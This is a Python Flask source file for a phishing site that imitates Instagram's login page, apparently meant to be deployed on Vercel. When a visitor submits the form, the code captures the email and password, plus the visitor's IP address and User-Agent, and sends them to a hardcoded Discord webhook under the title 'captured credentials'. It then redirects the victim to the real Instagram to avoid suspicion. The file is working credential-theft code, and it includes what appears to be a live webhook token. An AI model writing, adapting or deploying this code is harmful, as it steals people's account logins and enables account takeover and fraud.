import os
from flask import Flask, request, render_template, redirect, send_from_directory
import requests

app = Flask(
    __name__,
    static_folder=os.path.abspath(os.path.join(os.path.dirname(__file__), "../static")),
    template_folder=os.path.abspath(os.path.join(os.path.dirname(__file__), "../templates"))
)

WEBHOOK = "https://discord.com/api/webhooks/1356844204608721017/GB-N9jMt__CmHGiFaJUAOg_doQBZTNH0GjOoTwekMa_SBmIff-NKyk91FUDDQuhfCQE2"

@app.route("/img/<path:filename>")
def serve_img(filename):
    return send_from_directory(os.path.abspath(os.path.join(os.path.dirname(__file__), "../img")), filename)

@app.route("/", methods=["GET", "POST"])
def index():
    if request.method == "POST":
        email = request.form.get("email")
        password = request.form.get("password")
        ip = request.headers.get("x-forwarded-for", request.remote_addr)
        user_agent = request.headers.get("User-Agent")

        data = {
            "username": "Instagram Clone Logger",
            "embeds": [
                {
                    "title": "Credenciais capturadas",
                    "color": 0x00FFFF,
                    "fields": [
                        {"name": "Email/Login", "value": email, "inline": True},
                        {"name": "Senha", "value": password, "inline": True},
                        {"name": "IP", "value": ip, "inline": False},
                        {"name": "User-Agent", "value": user_agent, "inline": False}
                    ]
                }
            ]
        }

        try:
            requests.post(WEBHOOK, json=data)
        except Exception as e:
            print(f"[!] Erro ao enviar webhook: {e}")

        return redirect("https://www.instagram.com")

    return render_template("index.html")

# NECESSÁRIO para Vercel
handler = app
